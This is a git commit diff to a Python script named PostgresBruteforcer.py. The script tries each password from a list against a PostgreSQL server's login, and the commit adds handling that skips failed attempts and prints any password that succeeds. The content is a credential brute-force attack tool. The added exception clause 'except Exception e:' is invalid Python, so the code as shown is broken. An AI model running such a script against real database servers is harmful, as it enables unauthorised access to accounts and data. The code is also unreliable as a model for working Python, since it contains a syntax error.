2e78a4b6134e8c332c998bc29dab5a653badfccd
Matias Sequeira <matiassequeira@gmail.com>
2020-10-14 12:47:58 -0400

    push

--- PostgresBruteforcer.py
+++ PostgresBruteforcer.py
@@ -18,13 +18,18 @@ for current_password in password_list:
 
     print(f'Testing password: {current_password}')
 
-    engine = psycopg2.connect(
-        database="postgres",
-        user=current_user,
-        password=current_password,
-        host=host,
-        port='5432'
-    )
+    try:
+        engine = psycopg2.connect(
+            database="postgres",
+            user=current_user,
+            password=current_password,
+            host=host,
+            port='5432'
+        )
+    except Exception e:
+        continue
+    
+    print(f'Found: {current_password}')
 
 elapsed = (time.time() - start)
 print(f'\nBruteforcing time: {elapsed}')
